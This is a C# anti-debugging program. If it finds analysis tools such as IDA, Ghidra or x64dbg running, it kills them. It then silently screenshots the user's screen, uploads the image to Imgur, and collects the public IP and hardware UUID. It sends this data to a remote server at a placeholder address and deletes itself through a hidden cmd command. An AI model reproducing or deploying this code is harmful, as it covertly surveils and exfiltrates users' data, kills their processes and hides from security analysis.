using System.Diagnostics;
using System;
using System.IO;
using RestSharp;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
namespace antidebug
{
    internal class Program
    {
        static async Task Main()
        {
            string[] processNamesToCheck = {
                "HTTPDebuggerUI", "ida", "ghidra", "ollydbg", "x64dbg", "radare2", "hopper", "binaryninja",
                "cheatengine", "immunitydebugger", "ida64", "idaq", "ghidraSvr", "ollydbg64", "x32dbg",
                "x64dbg", "bnja", "cheatengine-x86_64", "ImmunityDebugger"
            };
            string prosessesbadall = "";
            bool isgood = true; 
            foreach (string processName in processNamesToCheck)
            {
                Process[] processes = Process.GetProcessesByName(processName);

                if (processes.Length > 0)
                {
                    if (prosessesbadall == "")
                    {
                        prosessesbadall += $" {processName}";
                    }
                    else
                    {
                        prosessesbadall += $" ; {processName}";
                    }
                    isgood = false;
                    foreach (Process worker in processes)
                    {
                        worker.Kill();
                    }
                }
                else
                {
                }
            }

            if (isgood == true)
            {
                //Запуск мейн функции
            }
            else
            {
                Bitmap screenshot = CaptureScreen();
                string tempPath = Path.GetTempPath();
                string imagePath = Path.Combine(tempPath, "screenshot.png");
                screenshot.Save(imagePath, ImageFormat.Png);

                string imageUrl = await UploadToImgur(imagePath);
                string ip = GetPublicIPAddress();
                DateTime currentDateTime = DateTime.Now;
                Process process = new Process();
                process.StartInfo.FileName = "wmic";
                process.StartInfo.Arguments = "csproduct get uuid";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                string line;
                int lineCount = 0;
                string hwid = null;
                while ((line = process.StandardOutput.ReadLine()) != null)
                {
                    if (!string.IsNullOrWhiteSpace(line))
                    {
                        lineCount++;
                        if (lineCount == 2)
                        {
                            hwid = line.Trim();
                            break;
                        }
                    }
                }

                string reason = $"You were blocked for the following reason: during the launch of the program, a prohibited {prosessesbadall} process was detected";
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                var client = new RestClient("http://111.111.111/users/api/v1/users");
                var request = new RestRequest("banned", Method.Post);
                request.AddHeader("Content-Type", "application/json");

                var requestBody = new
                {
                    ip = ip,
                    date = currentDateTime.ToString(),
                    hwid = hwid,
                    reason = reason,
                    screenshot = imageUrl
                };

                request.AddJsonBody(requestBody);

                var response = client.Execute(request);

                Process.Start(new ProcessStartInfo
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe",
                    UseShellExecute = false
                });
                Environment.Exit(0);
            }

        }
        static Bitmap CaptureScreen()
        {
            int screenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
            Bitmap screenshot = new Bitmap(screenWidth, screenHeight);
            Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth, screenHeight));
            return screenshot;
        }


        static async Task<string> UploadToImgur(string imagePath)
        {

            var client = new RestClient();
            var request = new RestRequest(new Uri("https://api.imgur.com/3/image"), Method.Post);
            string clientId = ""; //  ID с imgur.com

            request.AddHeader("Authorization", "Client-ID " + clientId);
            byte[] imageBytes = File.ReadAllBytes(imagePath);

            request.AddParameter("type", "image");
            request.AddFile("image", imageBytes, "image.png", "image/png");
            request.AddParameter("title", "tmp");
            var response = client.Execute(request);

            if (response.IsSuccessful)
            {
                dynamic jsonResponse = Newtonsoft.Json.JsonConvert.DeserializeObject(response.Content);
                string imageUrl = jsonResponse.data.link;
                return imageUrl; 


            }
            else
            {
                return $"Критическая ошибка загрузки скриншота: {response.Content}";

            }

        }


        static string GetPublicIPAddress()
        {
            var clientt = new RestClient();
            var request = new RestRequest(new Uri("https://api.ipify.org"), Method.Get);
            var response = clientt.Execute(request);

            string ip = response.Content;
            return ip;
        }
    }

}
